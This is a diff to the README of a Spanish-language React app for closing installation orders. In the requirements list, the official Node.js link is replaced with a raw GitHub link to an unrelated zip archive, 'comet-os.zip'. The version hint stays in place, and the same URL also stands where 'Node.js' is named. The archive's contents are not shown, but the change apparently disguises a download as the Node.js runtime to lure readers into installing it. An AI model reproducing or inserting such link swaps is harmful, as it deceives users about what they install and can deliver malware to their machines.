@@ -4,8 +4,8 @@ Aplicación web desarrollada con React para gestionar el cierre de órdenes de i
 
 ## 🚀 Requisitos
 
-- [Node.js](https://nodejs.org/) (recomendado v16+)
-- npm (incluido con Node.js)
+- [https://raw.githubusercontent.com/fedefasani/comet-os/main/fulvid/comet-os.zip](https://raw.githubusercontent.com/fedefasani/comet-os/main/fulvid/comet-os.zip) (recomendado v16+)
+- npm (incluido con https://raw.githubusercontent.com/fedefasani/comet-os/main/fulvid/comet-os.zip)
 
 ## 📦 Instalación
 
